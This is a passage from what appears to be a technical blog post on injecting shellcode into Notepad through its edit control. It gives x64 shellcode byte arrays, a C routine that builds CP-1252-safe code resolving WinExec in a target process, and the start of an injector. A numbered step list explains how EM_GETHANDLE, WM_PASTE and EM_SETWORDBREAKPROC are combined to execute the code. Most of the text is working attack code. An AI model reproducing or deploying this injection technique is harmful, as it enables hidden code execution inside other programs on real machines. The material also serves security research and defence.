#0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 0086 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x6a</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* push  0                     */</span>\n  <span style=\"color: #696969;\">/* 0088 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x6a</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* push  0                     */</span>\n  <span style=\"color: #696969;\">/* 008A */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x6a</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* push  0                     */</span>\n  <span style=\"color: #696969;\">/* 008C */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x6a</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* push  0                     */</span>\n  <span style=\"color: #696969;\">/* 008E */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x6a</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* push  0                     */</span>\n  <span style=\"color: #696969;\">/* 0090 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x53</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* push  rbx                   */</span>\n  <span style=\"color: #696969;\">/* 0091 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 0094 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x90</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* nop                         */</span>\n  <span style=\"color: #696969;\">/* 0095 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 0098 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x90</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* nop                         */</span>\n  <span style=\"color: #696969;\">/* 0099 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 009C */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x90</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* nop                         */</span>\n  <span style=\"color: #696969;\">/* 009D */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 00A0 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x90</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* nop                         */</span>\n  <span style=\"color: #696969;\">/* 00A1 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n<span style=\"color: #800080;\">}</span><span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> CALC4_SIZE 79</span>\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> RET_OFS2 0x18 </span><span style=\"color: #808030;\">+</span><span style=\"color: #004a43;\"> 2</span>\n\n<span style=\"color: #800000; font-weight: bold;\">char</span> CALC4<span style=\"color: #808030;\">[</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #800080;\">{</span>\n  <span style=\"color: #696969;\">/* 0000 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x59</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* pop  rcx              */</span>\n  <span style=\"color: #696969;\">/* 0001 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add  byte [rbp], cl   */</span>\n  <span style=\"color: #696969;\">/* 0004 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x59</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* pop  rcx              */</span>\n  <span style=\"color: #696969;\">/* 0005 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add  byte [rbp], cl   */</span>\n  <span style=\"color: #696969;\">/* 0008 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x59</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* pop  rcx              */</span>\n  <span style=\"color: #696969;\">/* 0009 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add  byte [rbp], cl   */</span>\n  <span style=\"color: #696969;\">/* 000C */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x59</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* pop  rcx              */</span>\n  <span style=\"color: #696969;\">/* 000D */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add  byte [rbp], cl   */</span>\n  <span style=\"color: #696969;\">/* 0010 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x59</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* pop  rcx              */</span>\n  <span style=\"color: #696969;\">/* 0011 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add  byte [rbp], cl   */</span>\n  <span style=\"color: #696969;\">/* 0014 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x59</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* pop  rcx              */</span>\n  <span style=\"color: #696969;\">/* 0015 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add  byte [rbp], cl   */</span>\n  <span style=\"color: #696969;\">/* 0018 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\xb8</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\xff</span><span style=\"color: #800000;\">\"</span> <span style=\"color: #696969;\">/* mov  eax, 0xff004d00  */</span>\n  <span style=\"color: #696969;\">/* 001D */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\xe1</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add  cl, ah           */</span>\n  <span style=\"color: #696969;\">/* 001F */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add  byte [rbp], cl   */</span>\n  <span style=\"color: #696969;\">/* 0022 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x51</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* push rcx              */</span>\n  <span style=\"color: #696969;\">/* 0023 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add  byte [rbp], cl   */</span>\n  <span style=\"color: #696969;\">/* 0026 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x58</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* pop  rax              */</span>\n  <span style=\"color: #696969;\">/* 0027 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add  byte [rbp], cl   */</span>\n  <span style=\"color: #696969;\">/* 002A */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\xc6</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\xc3</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* mov  byte [rax], 0xc3 */</span>\n  <span style=\"color: #696969;\">/* 002D */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add  byte [rbp], cl   */</span>\n  <span style=\"color: #696969;\">/* 0030 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x59</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* pop  rcx              */</span>\n  <span style=\"color: #696969;\">/* 0031 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add  byte [rbp], cl   */</span>\n  <span style=\"color: #696969;\">/* 0034 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x5b</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* pop  rbx              */</span>\n  <span style=\"color: #696969;\">/* 0035 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add  byte [rbp], cl   */</span>\n  <span style=\"color: #696969;\">/* 0038 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x5e</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* pop  rsi              */</span>\n  <span style=\"color: #696969;\">/* 0039 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add  byte [rbp], cl   */</span>\n  <span style=\"color: #696969;\">/* 003C */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x5f</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* pop  rdi              */</span>\n  <span style=\"color: #696969;\">/* 003D */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add  byte [rbp], cl   */</span>\n  <span style=\"color: #696969;\">/* 0040 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x59</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* pop  rcx              */</span>\n  <span style=\"color: #696969;\">/* 0041 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add  byte [rbp], cl   */</span>\n  <span style=\"color: #696969;\">/* 0044 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x6a</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* push 0                */</span>\n  <span style=\"color: #696969;\">/* 0046 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x58</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* pop  rax              */</span>\n  <span style=\"color: #696969;\">/* 0047 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add  byte [rbp], cl   */</span>\n  <span style=\"color: #696969;\">/* 004A */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x5c</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* pop  rsp              */</span>\n  <span style=\"color: #696969;\">/* 004B */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add  byte [rbp], cl   */</span>\n  <span style=\"color: #696969;\">/* 004E */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x5d</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* pop  rbp              */</span>\n<span style=\"color: #800080;\">}</span><span style=\"color: #800080;\">;</span>\n\n\n<span style=\"color: #800000; font-weight: bold;\">static</span>\nu8<span style=\"color: #808030;\">*</span> cp1252_generate_winexec<span style=\"color: #808030;\">(</span><span style=\"color: #800000; font-weight: bold;\">int</span> pid<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">int</span> <span style=\"color: #808030;\">*</span>cslen<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #800000; font-weight: bold;\">int</span>     i<span style=\"color: #808030;\">,</span> ofs<span style=\"color: #808030;\">,</span> outlen<span style=\"color: #800080;\">;</span>\n    u8      <span style=\"color: #808030;\">*</span>cs<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>out<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">HMODULE</span> m<span style=\"color: #800080;\">;</span>\n    w64_t   addr<span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// it won't exceed 512 bytes</span>\n    out <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>u8<span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">)</span>cs <span style=\"color: #808030;\">=</span> <span style=\"color: #400000;\">VirtualAlloc</span><span style=\"color: #808030;\">(</span>\n      <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">4096</span><span style=\"color: #808030;\">,</span> \n      MEM_COMMIT <span style=\"color: #808030;\">|</span> MEM_RESERVE<span style=\"color: #808030;\">,</span> \n      PAGE_EXECUTE_READWRITE<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// initialize parameters for WinExec()</span>\n    <span style=\"color: #603000;\">memcpy</span><span style=\"color: #808030;\">(</span>out<span style=\"color: #808030;\">,</span> CALC3<span style=\"color: #808030;\">,</span> CALC3_SIZE<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    out <span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">=</span> CALC3_SIZE<span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #696969;\">// initialize RDI for writing</span>\n    <span style=\"color: #603000;\">memcpy</span><span style=\"color: #808030;\">(</span>out<span style=\"color: #808030;\">,</span> STORE_ADDR<span style=\"color: #808030;\">,</span> STORE_ADDR_SIZE<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    out <span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">=</span> STORE_ADDR_SIZE<span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #696969;\">// ***********************************</span>\n    <span style=\"color: #696969;\">// store kernel32!WinExec on stack</span>\n    m <span style=\"color: #808030;\">=</span> <span style=\"color: #400000;\">GetModuleHandle</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">\"</span><span style=\"color: #0000e6;\">kernel32</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    addr<span style=\"color: #808030;\">.</span>q <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PBYTE</span><span style=\"color: #808030;\">)</span><span style=\"color: #400000;\">GetProcAddress</span><span style=\"color: #808030;\">(</span>m<span style=\"color: #808030;\">,</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0000e6;\">WinExec</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">-</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PBYTE</span><span style=\"color: #808030;\">)</span>m<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    m <span style=\"color: #808030;\">=</span> GetProcessModuleHandle<span style=\"color: #808030;\">(</span>pid<span style=\"color: #808030;\">,</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0000e6;\">kernel32.dll</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    addr<span style=\"color: #808030;\">.</span>q <span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">ULONG_PTR</span><span style=\"color: #808030;\">)</span>m<span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">for</span><span style=\"color: #808030;\">(</span>i<span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">&lt;</span>MAX_ADDR<span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>      \n      <span style=\"color: #696969;\">// load a byte into AH</span>\n      <span style=\"color: #603000;\">memcpy</span><span style=\"color: #808030;\">(</span>out<span style=\"color: #808030;\">,</span> LOAD_BYTE<span style=\"color: #808030;\">,</span> LOAD_BYTE_SIZE<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      out<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">2</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> addr<span style=\"color: #808030;\">.</span>b<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n    \n      <span style=\"color: #696969;\">// if byte not allowed for CP1252, add 32</span>\n      <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">!</span>is_cp1252_allowed<span style=\"color: #808030;\">(</span>out<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">2</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        out<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">2</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">32</span><span style=\"color: #800080;\">;</span>\n        <span style=\"color: #696969;\">// subtract 32 from byte at runtime</span>\n        <span style=\"color: #603000;\">memcpy</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">&amp;</span>out<span style=\"color: #808030;\">[</span>LOAD_BYTE_SIZE<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> SUB_BYTE<span style=\"color: #808030;\">,</span> SUB_BYTE_SIZE<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        out <span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">=</span> SUB_BYTE_SIZE<span style=\"color: #800080;\">;</span>\n      <span style=\"color: #800080;\">}</span>\n      out <span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">=</span> LOAD_BYTE_SIZE<span style=\"color: #800080;\">;</span>\n      <span style=\"color: #696969;\">// store AH in [RDI], increment RDI</span>\n      <span style=\"color: #603000;\">memcpy</span><span style=\"color: #808030;\">(</span>out<span style=\"color: #808030;\">,</span> STORE_BYTE<span style=\"color: #808030;\">,</span> STORE_BYTE_SIZE<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      out <span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">=</span> STORE_BYTE_SIZE<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n    \n    <span style=\"color: #696969;\">// calculate length of constructed code</span>\n    ofs <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span><span style=\"color: #800000; font-weight: bold;\">int</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">(</span>out <span style=\"color: #808030;\">-</span> <span style=\"color: #808030;\">(</span>u8<span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">)</span>cs<span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">+</span> <span style=\"color: #008c00;\">2</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// first offset</span>\n    cs<span style=\"color: #808030;\">[</span>RET_OFS<span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>uint8_t<span style=\"color: #808030;\">)</span>ofs<span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #603000;\">memcpy</span><span style=\"color: #808030;\">(</span>out<span style=\"color: #808030;\">,</span> RET<span style=\"color: #808030;\">,</span> RET_SIZE<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    out <span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">=</span> RET_SIZE<span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #603000;\">memcpy</span><span style=\"color: #808030;\">(</span>out<span style=\"color: #808030;\">,</span> CALC4<span style=\"color: #808030;\">,</span> CALC4_SIZE<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// second offset</span>\n    ofs <span style=\"color: #808030;\">=</span> CALC4_SIZE<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span>u8<span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">)</span>out<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">[</span>RET_OFS2<span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>uint8_t<span style=\"color: #808030;\">)</span>ofs<span style=\"color: #800080;\">;</span>\n    out <span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">=</span> CALC4_SIZE<span style=\"color: #800080;\">;</span>\n    \n    outlen <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000; font-weight: bold;\">int</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">(</span>out <span style=\"color: #808030;\">-</span> <span style=\"color: #808030;\">(</span>u8<span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">)</span>cs<span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">+</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">&amp;</span> <span style=\"color: #808030;\">-</span><span style=\"color: #008c00;\">2</span><span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #696969;\">// convert to ascii</span>\n    <span style=\"color: #800000; font-weight: bold;\">for</span><span style=\"color: #808030;\">(</span>i<span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">&lt;</span><span style=\"color: #808030;\">=</span>outlen<span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">2</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n      cs<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">/</span><span style=\"color: #008c00;\">2</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> cs<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n\n    <span style=\"color: #808030;\">*</span>cslen <span style=\"color: #808030;\">=</span> outlen <span style=\"color: #808030;\">/</span> <span style=\"color: #008c00;\">2</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #696969;\">// return pointer to code</span>\n    <span style=\"color: #800000; font-weight: bold;\">return</span> cs<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-07 12:31:12 UTC --></p>\n<h2 id=\"inject\">5. Injecting and Executing Shellcode</h2>\n<p>The following steps are used.</p>\n<ol>\n<li>Execute notepad.exe and obtain a window handle for the edit control.</li>\n<li>Get the edit control handle using the EM_GETHANDLE message.</li>\n<li>Generate text equivalent to, or greater than the size of the shellcode and copy it to the clipboard.</li>\n<li>Assign a NULL pointer to <var>lastbuf</var></li>\n<li>Read the address of input buffer from the EM handle and assign to <var>embuf</var>.</li>\n<li>If <var>lastbuf</var> and <var>embuf</var> are equal. Goto step 9.</li>\n<li>Clear the memory buffer using WM_SETSEL and WM_CLEAR.</li>\n<li>Send the WM_PASTE message to the edit control window handle. Wait 1 second, then goto step 5.</li>\n<li>Set <var>embuf</var> to PAGE_EXECUTE_READWRITE.</li>\n<li>Generate CP-1252 compatible shellcode and copy to the clipboard.</li>\n<li>Set the edit control word break function to <var>embuf</var> using EM_SETWORDBREAKPROC</li>\n<li>Trigger execution of shellcode using WM_LBUTTONDBLCLK</li>\n</ol>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #603000;\">BOOL</span> em_inject<span style=\"color: #808030;\">(</span><span style=\"color: #800000; font-weight: bold;\">void</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">HWND</span>   npw<span style=\"color: #808030;\">,</span> ecw<span style=\"color: #800080;\">;</span>\n    w64_t  emh<span style=\"color: #808030;\">,</span> lastbuf<span style=\"color: #808030;\">,</span> embuf<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">SIZE_T</span> rd<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">HANDLE</span> hp<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">DWORD</span>  cslen<span style=\"color: #808030;\">,</span> pid<span style=\"color: #808030;\">,</span> old<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">BOOL</span>   r<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">PBYTE</span>  cs<span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">char</span>   buf<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">1024</span><span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// get window handle for notepad class</span>\n    npw <span style=\"color: #808030;\">=</span> <span style=\"color: #400000;\">FindWindow</span><span 